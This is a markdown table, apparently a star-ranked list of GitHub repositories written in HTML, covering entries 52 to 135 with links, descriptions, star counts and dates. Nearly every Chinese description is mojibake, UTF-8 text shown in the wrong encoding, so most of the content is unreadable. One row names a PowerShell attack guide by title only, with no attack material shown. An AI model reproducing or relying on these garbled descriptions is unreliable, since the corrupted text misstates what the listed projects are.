|52|[Muyangmin/glide-docs-cn](https://github.com/Muyangmin/glide-docs-cn)|GlideÁÆÄ‰Ωì‰∏≠ÊñáÊñáÊ°£Á´ôÁÇπÊâòÁÆ°È°πÁõÆ„ÄÇ|1.4k|HTML|07/20|
|53|[cxinping/PyQt5](https://github.com/cxinping/PyQt5)|„ÄäPyQt5Âø´ÈÄüÂºÄÂèë‰∏éÂÆûÊàò„ÄãÈÖçÂ•ó‰ª£Á†Å|1.3k|HTML|03/12|
|54|[xswei/d3js_doc](https://github.com/xswei/d3js_doc)|D3js‰∏≠ÊñáÊñáÊ°£  D3‰∏≠Êñá :bar_chart: :chart_with_upwards_trend: :tada:|1.3k|HTML|10/10|
|55|[Thinkgamer/books](https://github.com/Thinkgamer/books)|ÊäÄÊúØËµÑÊñôÂàÜ‰∫´|1.3k|HTML|05/20|
|56|[chokcoco/magicCss](https://github.com/chokcoco/magicCss)|CSS3Â•áÊÄùÂ¶ôÊÉ≥ÔºåÂçïÊ†áÁ≠æÂÆûÁé∞ÂêÑÁ±ªÂõæÂΩ¢|1.2k|HTML|02/08|
|57|[esofar/cnblogs-theme-silence](https://github.com/esofar/cnblogs-theme-silence)|üìñ ‰∏ÄÊ¨æ‰∏ìÊ≥®‰∫éÈòÖËØªÁöÑÂçöÂÆ¢Âõ≠‰∏ªÈ¢ò|1.2k|HTML|10/29|
|58|[monlor/MIXBOX-ARCHIVE](https://github.com/monlor/MIXBOX-ARCHIVE)|‰∏ÄÊ¨æÂü∫‰∫éShellÁöÑÂ∞èÁ±≥Ë∑ØÁî±Âô®Â∑•ÂÖ∑ÁÆ±ÔºåÂéü‰∏∫Monlor-ToolsÔºåA tool box for XiaoMi Router base on Shell.|1.2k|HTML|09/17|
|59|[joeyguo/blog](https://github.com/joeyguo/blog)|joeyguo's blog  ËØ∑ Watch Êàñ Star|1.2k|HTML|09/02|
|60|[yangkun19921001/Blog](https://github.com/yangkun19921001/Blog)|Android Èù¢ËØïÂÆùÂÖ∏„ÄÅÊï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï„ÄÅÈü≥ËßÜÈ¢ë (FFmpeg„ÄÅAAC„ÄÅx264„ÄÅMediaCodec)„ÄÅ C/C++ „ÄÅOpenCV„ÄÅË∑®Âπ≥Âè∞Á≠âÂ≠¶‰π†ËÆ∞ÂΩï„ÄÇ„Äê0Âü∫Á°ÄÈü≥ËßÜÈ¢ëËøõÈò∂Â≠¶‰π†Ë∑ØÁ∫ø„Äë|1.1k|HTML|09/22|
|61|[wx-chevalier/Awesome-CS-Books-and-Digests](https://github.com/wx-chevalier/Awesome-CS-Books-and-Digests)|:books: Awesome CS Books(with Digests)/Series(.pdf by git lfs) Warehouse for Geeks, ProgrammingLanguage, SoftwareEngineering, Web, AI, ServerSideApplication, Infrastructure, FE etc. :dizzy: ‰ºòÁßÄËÆ°ÁÆóÊú∫ÁßëÂ≠¶‰∏éÊäÄÊúØÈ¢ÜÂüüÁõ∏ÂÖ≥ÁöÑ‰π¶Á±çÂΩíÊ°£Ôºå‰ª•ÂèäÊàëÁöÑËØª‰π¶Á¨îËÆ∞„ÄÇ|1.1k|HTML|10/28|
|62|[shengxinjing/my_blog](https://github.com/shengxinjing/my_blog)|:snail:ÂÜô‰∏ÄÁÇπÂçöÂÆ¢Ôºåpython web ÂâçÁ´Ø ËøêÁª¥|1.1k|HTML|09/27|
|63|[sglfree/freesky](https://github.com/sglfree/freesky)|Ëá™Áî±Èó®ÊúÄÊñ∞7.90Áâà Êó†Áïå19.02Ê≠£ÂºèÁâà‰∏ãËΩΩ Ëá™Áî±Èó® Êó†Áïå Êó†ÁïåÊµèËßà Ëã±ÊñáÁâà ÁøªÂ¢ôËΩØ‰ª∂ ÁøªÂ¢ôÂ∑•ÂÖ∑ ‰∏ãËΩΩ ÁøªÂ¢ôËΩØ‰ª∂ÊïôÁ®ã MacÁøªÂ¢ôËΩØ‰ª∂ Ëá™Áî±Èó®‰ΩøÁî®ÊïôÁ®ã--Ëá™Áî±Â§©Á©∫|1.1k|HTML|10/29|
|64|[mzlogin/mzlogin.github.io](https://github.com/mzlogin/mzlogin.github.io)|Jekyll Themes / GitHub Pages ÂçöÂÆ¢Ê®°Êùø / A template repository for Jekyll based blog|990|HTML|10/29|
|65|[iwestlin/gd-utils](https://github.com/iwestlin/gd-utils)|Google Drive ÁôæÂÆùÁÆ±|985|HTML|10/14|
|66|[wx-chevalier/DistributedSystem-Series](https://github.com/wx-chevalier/DistributedSystem-Series)|:books: Ê∑±ÂÖ•ÊµÖÂá∫ÂàÜÂ∏ÉÂºèÂü∫Á°ÄÊû∂ÊûÑÔºåLinux ‰∏éÊìç‰ΩúÁ≥ªÁªüÁØá   ÂàÜÂ∏ÉÂºèÁ≥ªÁªüÁØá   ÂàÜÂ∏ÉÂºèËÆ°ÁÆóÁØá   Êï∞ÊçÆÂ∫ìÁØá   ÁΩëÁªúÁØá   ËôöÊãüÂåñ‰∏éÁºñÊéíÁØá   Â§ßÊï∞ÊçÆ‰∏é‰∫ëËÆ°ÁÆóÁØá|978|HTML|10/28|
|67|[liulangnan/aui](https://github.com/liulangnan/aui)|ÁßªÂä®Á´ØUIÂø´ÈÄüÂ∏ÉÂ±ÄËß£ÂÜ≥ÊñπÊ°àÔºå‰∏Ä‰∏™Èù†Ë∞±ÁöÑÈ´òÊÄßËÉΩÁßªÂä®ÂâçÁ´ØÊ°ÜÊû∂|968|HTML|08/22|
|68|[doocs/coding-interview](https://github.com/doocs/coding-interview)|üòÄ ‰ª£Á†ÅÈù¢ËØïÈ¢òÈõÜÔºåÂåÖÊã¨ÂâëÊåá Offer„ÄÅÁºñÁ®ã‰πãÁæéÁ≠â|930|HTML|10/20|
|69|[SangKa/MobX-Docs-CN](https://github.com/SangKa/MobX-Docs-CN)|MobX ‰∏≠ÊñáÊñáÊ°£|916|HTML|09/12|
|70|[tencentyun/qcloud-documents](https://github.com/tencentyun/qcloud-documents)|ËÖæËÆØ‰∫ëÂÆòÊñπÊñáÊ°£|898|HTML|10/30|
|71|[HelloGitHub-Team/Article](https://github.com/HelloGitHub-Team/Article)|ËÆ≤Ëß£ÂºÄÊ∫êÈ°πÁõÆÁ≥ªÂàóÊñáÁ´†Â∫ì|833|HTML|10/26|
|72|[sanyuan0704/my_blog](https://github.com/sanyuan0704/my_blog)|Á•û‰∏âÂÖÉÁöÑÂçöÂÆ¢Ôºå‰∏ÄËµ∑ÊûÑÂª∫ÂÆåÊï¥Áü•ËØÜ‰ΩìÁ≥ª|831|HTML|08/20|
|73|[netkiller/netkiller.github.io](https://github.com/netkiller/netkiller.github.io)|Netkiller Free ebook - ÂÖçË¥πÁîµÂ≠ê‰π¶|818|HTML|10/28|
|74|[wzy6642/Machine-Learning-in-Action-Python3](https://github.com/wzy6642/Machine-Learning-in-Action-Python3)|„ÄäÊú∫Âô®Â≠¶‰π†ÂÆûÊàò„Äãpython3Ê∫êÁ†Å|814|HTML|08/02|
|75|[kenzok8/openwrt-packages](https://github.com/kenzok8/openwrt-packages)|openwetÂ∏∏Áî®ËΩØ‰ª∂ÂåÖ|803|HTML|10/29|
|76|[iv-web/ppts](https://github.com/iv-web/ppts)|Âõ¢ÈòüÂØπÂ§ñÂàÜ‰∫´ppt|793|HTML|10/20|
|77|[SolidZORO/zpix-pixel-font](https://github.com/SolidZORO/zpix-pixel-font)|Zpix (ÊúÄÂÉèÁ¥†) is a pixel font supporting English, Traditional Chinese, Simplified Chinese and Japanese.|767|HTML|10/09|
|78|[vpncn/vpncn.github.io](https://github.com/vpncn/vpncn.github.io)|2020‰∏≠ÂõΩÁøªÂ¢ôËΩØ‰ª∂VPNÊé®ËçêÊåáÂçóÔºå‰ª•ÂèäÂØπÊØîVPSËá™Âª∫„ÄÅSSRÊú∫Âú∫„ÄÅËìùÁÅØ„ÄÅWireGuard„ÄÅV2ray„ÄÅËÄÅÁéãVPNÁ≠âÁßëÂ≠¶‰∏äÁΩëËΩØ‰ª∂‰∏éÁøªÂ¢ôÊñπÊ≥ïÁöÑ‰ºòÁº∫ÁÇπÔºå‰∏≠ÂõΩÊúÄÊñ∞ÁßëÂ≠¶‰∏äÁΩëÁøªÂ¢ôVPNÊ¢ØÂ≠êÊé®ËçêÔºåÁ®≥ÂÆöÂ•ΩÁî®„ÄÇ|756|HTML|10/29|
|79|[godbasin/godbasin.github.io](https://github.com/godbasin/godbasin.github.io)|Ë¢´Âà†ÂâçÁ´ØÂçöÂÆ¢--ÂñúÊ¨¢ËØ∑star|755|HTML|10/10|
|80|[TransparentLC/WechatMomentScreenshot](https://github.com/TransparentLC/WechatMomentScreenshot)|ÊúãÂèãÂúàËΩ¨ÂèëÊà™ÂõæÁîüÊàêÂ∑•ÂÖ∑|747|HTML|09/26|
|81|[FoXZilla/Pxer](https://github.com/FoXZilla/Pxer)|A tool for pixiv.net. ‰∫∫‰∫∫ÂèØÁî®ÁöÑPÁ´ôÁà¨Ëô´|718|HTML|09/04|
|82|[othree/markdown-syntax-zhtw](https://github.com/othree/markdown-syntax-zhtw)|Markdown Ë™ûÊ≥ïË™™Êòé‰∏≠ÊñáÁâà|708|HTML|08/14|
|83|[helloxz/ccaa](https://github.com/helloxz/ccaa)|Linux‰∏ÄÈîÆÂÆâË£ÖAria2 + AriaNg + FileBrowseÂÆûÁé∞Á¶ªÁ∫ø‰∏ãËΩΩ„ÄÅÊñá‰ª∂ÁÆ°ÁêÜ„ÄÇ|684|HTML|05/01|
|84|[lzjun567/python_scripts](https://github.com/lzjun567/python_scripts)|‰∏Ä‰∫õpythonÁõ∏ÂÖ≥ÁöÑÊºîÁ§∫‰ª£Á†Å|679|HTML|06/01|
|85|[typlog/china-indie-podcasts](https://github.com/typlog/china-indie-podcasts)|ÂèëÁé∞‰∏éÊé®ËçêÈ´òË¥®ÈáèÁöÑ‰∏≠ÊñáÁã¨Á´ãÊí≠ÂÆ¢|672|HTML|10/30|
|86|[wx-chevalier/ProgrammingLanguage-Series](https://github.com/wx-chevalier/ProgrammingLanguage-Series)|:books: ÁºñÁ®ãËØ≠Ë®ÄËØ≠Ê≥ïÂü∫Á°Ä‰∏éÂ∑•Á®ãÂÆûË∑µÔºåJavaScript   Java   Python   Go   Rust   CPP   Swift|634|HTML|10/28|
|87|[yangzongzhuan/RuoYi](https://github.com/yangzongzhuan/RuoYi)|(RuoYi)ÂÆòÊñπ‰ªìÂ∫ì Âü∫‰∫éSpringBootÁöÑÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªü ÊòìËØªÊòìÊáÇ„ÄÅÁïåÈù¢ÁÆÄÊ¥ÅÁæéËßÇ„ÄÇ Ê†∏ÂøÉÊäÄÊúØÈááÁî®Spring„ÄÅMyBatis„ÄÅShiroÊ≤°Êúâ‰ªª‰ΩïÂÖ∂ÂÆÉÈáçÂ∫¶‰æùËµñ„ÄÇÁõ¥Êé•ËøêË°åÂç≥ÂèØÁî®|630|HTML|10/22|
|88|[feiyu563/PrometheusAlert](https://github.com/feiyu563/PrometheusAlert)|Prometheus AlertÊòØÂºÄÊ∫êÁöÑËøêÁª¥ÂëäË≠¶‰∏≠ÂøÉÊ∂àÊÅØËΩ¨ÂèëÁ≥ªÁªü,ÊîØÊåÅ‰∏ªÊµÅÁöÑÁõëÊéßÁ≥ªÁªüPrometheus,Zabbix,Êó•ÂøóÁ≥ªÁªüGraylogÂíåÊï∞ÊçÆÂèØËßÜÂåñÁ≥ªÁªüGrafanaÂèëÂá∫ÁöÑÈ¢ÑË≠¶Ê∂àÊÅØ,ÊîØÊåÅÈíâÈíâ,ÂæÆ‰ø°,Âçé‰∏∫‰∫ëÁü≠‰ø°,ËÖæËÆØ‰∫ëÁü≠‰ø°,ËÖæËÆØ‰∫ëÁîµËØù,ÈòøÈáå‰∫ëÁü≠‰ø°,ÈòøÈáå‰∫ëÁîµËØùÁ≠â|577|HTML|10/10|
|89|[pengchujin/v2rayDocker](https://github.com/pengchujin/v2rayDocker)|‰∏ÄÈîÆv2ray ws + tls Êñπ‰æøÂ∞±ÂÆå‰∫ã‰∫Ü|573|HTML|10/12|
|90|[FrontEndRoad/HTML5-FAQ](https://github.com/FrontEndRoad/HTML5-FAQ)|H5È°πÁõÆÂ∏∏ËßÅÈóÆÈ¢òÊ±áÊÄªÂèäËß£ÂÜ≥ÊñπÊ°à|569|HTML|10/02|
|91|[flyingalex/design-patterns-by-php](https://github.com/flyingalex/design-patterns-by-php)|„ÄäÂ§ßËØùËÆæËÆ°Ê®°Âºè„ÄãphpÁâàÊú¨, https://design-patterns-by-php.hulin.ink|561|HTML|10/06|
|92|[justjavac/justjavac.github.com](https://github.com/justjavac/justjavac.github.com)|‰∏™‰∫∫ÂçöÂÆ¢ÔºåÂñúÊ¨¢ÁöÑËØùËØ∑ÁÇπ starÔºåÊÉ≥ËÆ¢ÈòÖÁÇπ watch :sparkles: |555|HTML|03/26|
|93|[pingan8787/Leo-JavaScript](https://github.com/pingan8787/Leo-JavaScript)|ËøôÈáåÊòØÊàëËá™Â∑±ÂØπ JavaScript Â≠¶‰π†ËµÑÊñôÁöÑÊï¥ÁêÜÔºåÂåÖÊã¨„ÄäCute-JavaScript„Äã„ÄÅÊ°ÜÊû∂„ÄÅHTTP„ÄÅGraphQL„ÄÅTS„ÄÅWebpackÁ≠âÔºåËøòÊúâÂæàÂ§ödemoÂíåÊñáÁ´†Ôºå‰πüÊòØ‰Ωú‰∏∫Ëá™Â∑±Â≠¶‰π†ÁªìÊûúÁöÑËæìÂá∫ÔºåÂñúÊ¨¢ÁöÑÊúãÂèãÊ¨¢Ëøéstat„ÄÇ:rocket:ÊåÅÁª≠Êõ¥Êñ∞‰∏≠...|542|HTML|10/25|
|94|[YMFE/ydoc](https://github.com/YMFE/ydoc)|üê∂YDoc ÊòØ‰∏Ä‰∏™Êõ¥ÊáÇ‰Ω†ÁöÑÊñáÊ°£Á´ôÊûÑÂª∫Â∑•ÂÖ∑ÔºåÂü∫‰∫é markdown ËΩªÊùæÁîüÊàêÂÆåÊï¥ÈùôÊÄÅÁ´ôÁÇπ|526|HTML|05/28|
|95|[wx-chevalier/SoftwareEngineering-Series](https://github.com/wx-chevalier/SoftwareEngineering-Series)|:books: ËΩØ‰ª∂Â∑•Á®ã„ÄÅÁÆóÊ≥ï‰∏éÊû∂ÊûÑÔºöÊï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ï„ÄÅËÆæËÆ°Ê®°Âºè„ÄÅËΩØ‰ª∂Êû∂ÊûÑ„ÄÅÂçèÂêåÂºÄÂèë„ÄÅË¥®Èáè‰øùÈöú QA|522|HTML|10/22|
|96|[Coq-zh/SF-zh](https://github.com/Coq-zh/SF-zh)|„ÄäËΩØ‰ª∂Âü∫Á°Ä„Äã‰∏≠ËØëÁâà Software Foundations Chinese Translation|522|HTML|09/03|
|97|[rootclay/Powershell-Attack-Guide](https://github.com/rootclay/Powershell-Attack-Guide)|PowershellÊîªÂáªÊåáÂçó----ÈªëÂÆ¢ÂêéÊ∏óÈÄè‰πãÈÅì|512|HTML|07/10|
|98|[twang281314/frontEnd](https://github.com/twang281314/frontEnd)|ÂâçÁ´ØÁõ∏ÂÖ≥|505|HTML|10/15|
|99|[isee15/Lunar-Solar-Calendar-Converter](https://github.com/isee15/Lunar-Solar-Calendar-Converter)|ÂÖ¨ÂéÜ(Èò≥ÂéÜ) ÂÜúÂéÜ(Èò¥ÂéÜ)ËΩ¨Êç¢ÔºåÊîØÊåÅÊó∂Èó¥ÊÆµ‰ªé1900-2100 Â¶ÇÊûúÈúÄË¶ÅÊõ¥ÈïøÁöÑÊó∂Èó¥ÊÆµÔºåÂà©Áî®generate.htmÁîüÊàêÁöÑÊï∞ÊçÆÂç≥ÂèØ„ÄÇ ÊîØÊåÅÂêÑÁßçÁºñÁ®ãËØ≠Ë®Ä C#,java,Objective-C,php,Python,javascript(nodejs),C/C++,ruby,swift,golangÁ≠â ÊîØÊåÅMacÔºåWindowsÔºåAndroidÔºåWPÂ§öÁßçÂπ≥Âè∞|499|HTML|10/12|
|100|[koala-coding/goodBlog](https://github.com/koala-coding/goodBlog)|ÊàëÊòØkoala, ÂÖ¨‰ºóÂè∑„ÄêÁ®ãÂ∫èÂëòÊàêÈïøÊåáÂåó„ÄëÁöÑ‰ΩúËÄÖÔºå ‰∏ìÊ≥®Node.jsÊäÄÊúØÊ†àÂàÜ‰∫´Ôºå‰ªéÂâçÁ´ØÂà∞Node.jsÂÜçÂà∞ÂêéÁ´ØÊï∞ÊçÆÂ∫ìÔºåÂ∏ÆÊÇ®Êàê‰∏∫‰ºòÁßÄÁöÑNode.jsÂÖ®Ê†àÂ∑•Á®ãÂ∏à„ÄÇÂíåÊàë‰∏ÄËµ∑ËøõÈò∂ÂÖ®Ê†àÂêßÔºÅ|496|HTML|09/12|
|101|[kgco/RateMySupervisor](https://github.com/kgco/RateMySupervisor)|Ê∞∏‰πÖÂÖçË¥πÂºÄÊ∫êÁöÑÂØºÂ∏àËØÑ‰ª∑Êï∞ÊçÆ„ÄÅÊï∞ÊçÆÁà¨Ëô´„ÄÅÊó†ÈúÄÁºñÁ®ãÂü∫Á°ÄÁöÑÂ±ïÁ§∫ÁΩëÈ°µ‰ª•ÂèäÊñ∞‰ø°ÊÅØË°•ÂÖÖÂπ≥Âè∞|495|HTML|09/16|
|102|[wx-chevalier/Awesome-Lists](https://github.com/wx-chevalier/Awesome-Lists)|:books: Guide to Galaxy, curated, worthy and up-to-date links/reading list for ITCS-Coding/Algorithm/SoftwareArchitecture/AI.  :dizzy: ITCS-ÁºñÁ®ã/ÁÆóÊ≥ï/ËΩØ‰ª∂Êû∂ÊûÑ/‰∫∫Â∑•Êô∫ËÉΩÁ≠âÈ¢ÜÂüüÁöÑÊñáÁ´†/‰π¶Á±ç/ËµÑÊñô/È°πÁõÆÈìæÊé•Á≤æÈÄâÔºåÂ≤ÅÊúàÊ≤âÊ∑ÄÁöÑÁæéÂ•Ω|491|HTML|10/29|
|103|[tanjiti/sec_profile](https://github.com/tanjiti/sec_profile)|Áà¨ÂèñsecwikiÂíåxuanwu.github.io/sec.today,ÂàÜÊûêÂÆâÂÖ®‰ø°ÊÅØÁ´ôÁÇπ„ÄÅÂÆâÂÖ®Ë∂ãÂäø„ÄÅÊèêÂèñÂÆâÂÖ®Â∑•‰ΩúËÄÖË¥¶Âè∑(twitter,weixin,githubÁ≠â)|479|HTML|10/29|
|104|[ningbonb/HTML5](https://github.com/ningbonb/HTML5)|HTML5Â≠¶‰π†„ÄÅÊÄªÁªì„ÄÅÂÆûË∑µ|474|HTML|07/01|
|105|[hornhuang/android_interviews](https://github.com/hornhuang/android_interviews)|üöÄEverything you need to know to find a android job. ÁÆóÊ≥ï / Èù¢ËØïÈ¢ò / Android Áü•ËØÜÁÇπ üî•üî•üî• ÊÄªÁªì‰∏çÊòìÔºå‰Ω†ÁöÑ star ÊòØÊàëÊúÄÂ§ßÁöÑÂä®ÂäõÔºÅ|473|HTML|04/11|
|106|[Homiss/Java-interview-questions](https://github.com/Homiss/Java-interview-questions)|üå±‰∏çÂÆöÊúüÊî∂ÈõÜÊï¥ÁêÜJavaÁõ∏ÂÖ≥Èù¢ËØïÈ¢ò|471|HTML|10/02|
|107|[raytaylorlin/hexo-theme-raytaylorism](https://github.com/raytaylorlin/hexo-theme-raytaylorism)|‰∏ÄÊ¨æMaterial DesignÈ£éÊ†ºÁöÑhexo‰∏ªÈ¢ò|464|HTML|04/07|
|108|[lyy289065406/re0-web](https://github.com/lyy289065406/re0-web)|Re0Ôºö‰ªéÈõ∂ÂºÄÂßãÁöÑÂºÇ‰∏ñÁïåÁîüÊ¥ª ÔºàWEBÁâàÔºâ|462|HTML|10/15|
|109|[xiaolai/blockchainlittlebook.com](https://github.com/xiaolai/blockchainlittlebook.com)|Âå∫ÂùóÈìæÂ∞èÁôΩ‰π¶|461|HTML|10/13|
|110|[ssy341/datatables-cn](https://github.com/ssy341/datatables-cn)|Datatables‚Äî‚Äî jquery Êèí‰ª∂‰∏≠ÊñáÁΩë|457|HTML|10/09|
|111|[MonkSoul/Fur](https://github.com/MonkSoul/Fur)|üêÆ Fur ÊòØ .NET 5 Âπ≥Âè∞‰∏ã‰ºÅ‰∏öÂ∫îÁî®ÂºÄÂèëÊúÄ‰Ω≥ÂÆûË∑µÊ°ÜÊû∂„ÄÇÔºàv1.0.0-rc.final.31Ôºâ|457|HTML|10/29|
|112|[asyncins/antispider](https://github.com/asyncins/antispider)|‰π¶Á±ç„ÄäPython3 ÂèçÁà¨Ëô´ÂéüÁêÜ‰∏éÁªïËøáÂÆûÊàò„ÄãÈÖçÂ•ó‰ª£Á†Å|450|HTML|06/25|
|113|[Mark24Code/15minGit](https://github.com/Mark24Code/15minGit)|SourceTree/GitËΩªÊåáÂçó(15ÂàÜÈíüÂ≠¶‰ºöGitÂ¢ûÂº∫ÁâàÔºâ|447|HTML|02/16|
|114|[insoxin/qrpay](https://github.com/insoxin/qrpay)|‰∫îÂêà‰∏ÄÊî∂Ê¨æÁ†ÅÂú®Á∫øÁîüÊàê,40‰∏™Ê®°Êùø ÊîØÊåÅÂæÆ‰ø°ÊîØ‰ªò„ÄÅÊîØ‰ªòÂÆùÊîØ‰ªò„ÄÅÊâãÊú∫QQÊîØ‰ªò„ÄÅ‰∫¨‰∏úÈí±ÂåÖ„ÄÅÁôæÂ∫¶Èí±ÂåÖ,PayPal‰∫îÂêà‰∏ÄÊî∂Ê¨æÔºåÂ∞ÜÂÖ∂‰∫åÁª¥Á†ÅÂêàÂπ∂‰∏∫‰∏Ä‰∏™‰∫åÁª¥Á†ÅÔºåÊó†ÈúÄÊâãÁª≠Ë¥π,ÊîØÊåÅqqÂ§¥ÂÉè,ÊòµÁß∞Âà§Êñ≠(HTMLÂçïÈ°µÁâàÂ§öÊ®°ÊùøÂÖçÂÆâË£Ö) ËÖæËÆØ‰∫ëÊúçÂä°Âô® https://api.isoyu.com/qrpay/  ËÖæËÆØ‰∫ëCOS https://qrpay.isoyu.com/|443|HTML|04/10|
|115|[TIM168/technical_books](https://github.com/TIM168/technical_books)|:books:üî•Êî∂ÈõÜÂÖ®ÁΩëÊúÄÁÉ≠Èó®ÁöÑÊäÄÊúØ‰π¶Á±ç (GO„ÄÅÈªëÂÆ¢„ÄÅAndroid„ÄÅËÆ°ÁÆóÊú∫ÂéüÁêÜ„ÄÅ‰∫∫Â∑•Êô∫ËÉΩ„ÄÅÂ§ßÊï∞ÊçÆ„ÄÅÊú∫Âô®Â≠¶‰π†„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅPHP„ÄÅjava„ÄÅÊû∂ÊûÑ„ÄÅÊ∂àÊÅØÈòüÂàó„ÄÅÁÆóÊ≥ï„ÄÅpython„ÄÅÁà¨Ëô´„ÄÅÊìç‰ΩúÁ≥ªÁªü„ÄÅlinux„ÄÅCËØ≠Ë®Ä)Ôºå‰∏çÈó¥Êñ≠Êõ¥Êñ∞‰∏≠:hotsprings:|443|HTML|04/14|
|116|[facert/beijing_house_knowledge](https://github.com/facert/beijing_house_knowledge)|Âåó‰∫¨‰π∞ÊàøÊîªÁï•|438|HTML|08/06|
|117|[Paull/hiwifi.easucks](https://github.com/Paull/hiwifi.easucks)|ÊûÅË∑ØÁî±Âô®ÂÆòÊñπÂõ∫‰ª∂ÁöÑÊèí‰ª∂ÔºåFIFAÂä©ÊâãÔºåSSÔºåFor 1.2.5-1.5.9|434|HTML|08/13|
|118|[yanhaijing/vertical-center](https://github.com/yanhaijing/vertical-center)|Ê∞¥Âπ≥ÂûÇÁõ¥Â±Ö‰∏≠ÔºåËøôÊòØ‰∏ÄÈÅìÈù¢ËØïÂøÖËÄÉÈ¢òÔºå^_^|431|HTML|05/28|
|119|[renzhezhilu/webp2jpg-online](https://github.com/renzhezhilu/webp2jpg-online)|Use the browser's online image format converter, no need to upload files, you can convert jpeg, jpg, png, gif, webp, svg, ico, bmp files to jpeg, png, webp animation, gif, base64,avif,mozjpeg. ‰ΩøÁî®ÊµèËßàÂô®ÁöÑÂú®Á∫øÂõæÁâáÊ†ºÂºèËΩ¨ÂåñÂô®,Êó†ÈúÄ‰∏ä‰º†Êñá‰ª∂,ÂèØÂ∞Üjpeg„ÄÅjpg„ÄÅpng„ÄÅgif„ÄÅwebp„ÄÅsvg„ÄÅico„ÄÅbmpÊñá‰ª∂ËΩ¨Êç¢‰∏∫jpeg„ÄÅpng„ÄÅwebp„ÄÅwebpÂä®Áîª„ÄÅgif„ÄÅbase64„ÄÅavif„ÄÅmozjpeg ...|430|HTML|10/23|
|120|[wangding/courses](https://github.com/wangding/courses)|:rocket: ÂΩïÂà∂ÁöÑËßÜÈ¢ëËØæÁ®ãËµÑÊñô|425|HTML|06/27|
|121|[mercyblitz/mercyblitz.github.io](https://github.com/mercyblitz/mercyblitz.github.io)|Â∞èÈ©¨Âì•ÁöÑÊäÄÊúØÂçöÂÆ¢ :D|418|HTML|10/28|
|122|[w3c/chinese-ig](https://github.com/w3c/chinese-ig)|Web‰∏≠ÊñáÂÖ¥Ë∂£ÁªÑ|418|HTML|10/15|
|123|[xiahouzuoxin/notes](https://github.com/xiahouzuoxin/notes)|Á†îÁ©∂ÁîüÈò∂ÊÆµÁöÑ‰∏Ä‰∫õÊñáÁ´†ÔºàÊäÄÊúØ„ÄÅÊÄùËÄÉ„ÄÅËØª‰π¶Á¨îËÆ∞„ÄÅÊó•Â∏∏Áêê‰∫ãÁ≠âÔºâ|383|HTML|06/15|
|124|[TZG-official/Jvav](https://github.com/TZG-official/Jvav)|J v a v ‰∏é ÊÇ®|383|HTML|08/17|
|125|[gwuhaolin/resume](https://github.com/gwuhaolin/resume)|ÁÆÄÁ∫¶ÁöÑÂú®Á∫øÁÆÄÂéÜ|380|HTML|08/28|
|126|[muyinchen/simviso-Source-code-interpretation-sharing](https://github.com/muyinchen/simviso-Source-code-interpretation-sharing)|simviso ÁöÑ‰∏ÄÁ≥ªÂàóÊ∫êÁ†ÅËß£ËØªÂàÜ‰∫´ËßÜÈ¢ëÔºåÊ∂âÂèäÂõΩÂ§ñÈ°∂Á∫ßÂ≠¶Â∫úËØæÁ®ãÁøªËØë„ÄÅÂõΩÂ§ñÈ°∂Á∫ßÂºÄÂèëËÄÖËßÜÈ¢ëÁøªËØëÔºåJDK, RxjavaÔºåSpring ReactorÔºå Netty ÔºåReactor-Netty ÔºåSpring Webflux  ÊàëÁöÑÁõÆÊ†áÊòØÂ∞ÜJavaÁöÑÂìçÂ∫îÂºèÂª∫Á´ãËµ∑‰∏ÄÂ•óÂ≠¶‰π†‰ΩìÁ≥ªÔºåÂÅáÂ¶Ç‰Ω†ÊÉ≥Ê∑±ÂÖ•ÔºåÂèØ‰ª•ÂèÇËÄÉÊàëÁöÑËßÜÈ¢ëÂíåÂêéÁª≠Âá∫ÁâàÁöÑ‰π¶Á±çÔºåÂêåÊó∂Â±ïÁé∞‰∏Ä‰∫õÊàëÁöÑÁºñÁ®ãÁªèÈ™åÔºåÂÅö‰∏Ä‰∏™Èì∫Ë∑Ø‰∫∫|378|HTML|10/13|
|127|[polaris1119/pkgdoc](https://github.com/polaris1119/pkgdoc)|go Ê†áÂáÜÂ∫ìÂíåÈÉ®ÂàÜÁ¨¨‰∏âÊñπÂåÖÁöÑÂåÖÊñáÊ°£‰∏≠ÊñáÁøªËØë|367|HTML|10/09|
|128|[wangzhengya/cheatsheet](https://github.com/wangzhengya/cheatsheet)|ÂâçÁ´ØCheat SheetÂà∂‰ΩúÂàÜ‰∫´|364|HTML|07/29|
|129|[pengan1987/computer-museum-dnbwg](https://github.com/pengan1987/computer-museum-dnbwg)|ÁîµËÑëÂçöÁâ©È¶Ü - DNBWG.com|364|HTML|09/06|
|130|[geeeeeeeek/videoproject](https://github.com/geeeeeeeek/videoproject)|Âü∫‰∫épython/djangoÁöÑËßÜÈ¢ëÁÇπÊí≠ÁΩëÁ´ô|357|HTML|08/19|
|131|[OpenIoTHub/OpenIoTHub](https://github.com/OpenIoTHub/OpenIoTHub)|üíñA free IoT (Internet of Things)  platform and private cloud. [‰∏Ä‰∏™ÂÖçË¥πÁöÑÁâ©ËÅîÁΩëÂíåÁßÅÊúâ‰∫ëÂπ≥Âè∞ÔºåÊîØÊåÅÂÜÖÁΩëÁ©øÈÄè]|355|HTML|10/22|
|132|[HuangCongQing/UCAS_Course_2019](https://github.com/HuangCongQing/UCAS_Course_2019)|‰∏≠ÂõΩÁßëÂ≠¶Èô¢Â§ßÂ≠¶2019-2020ËØæÁ®ãÔºàÁßãÂ≠£ÔºåÊò•Â≠£ÔºåÂ§èÂ≠£Ôºâ|354|HTML|09/14|
|133|[iamjoel/front-end-note](https://github.com/iamjoel/front-end-note)|:memo: WebÂâçÁ´ØÊ¥ûËßÅ„ÄÇÊúâÊ∑±Â∫¶ÁöÑWeb ÂâçÁ´ØÂÜÖÂÆπ„ÄÇ|351|HTML|09/05|
|134|[wmyskxz/MoreThanJava](https://github.com/wmyskxz/MoreThanJava)|Â≠¶‰π†, ‰∏çÊ≠¢ Code üë®‚Äçüíª‚Äç|337|HTML|09/16|
|135|[nestcn/docs.nestjs.cn](https://github.com/nestcn/docs.nestjs.cn)|nestjs ‰∏≠ÊñáÊñáÊ°£|335|HTML|10/29|
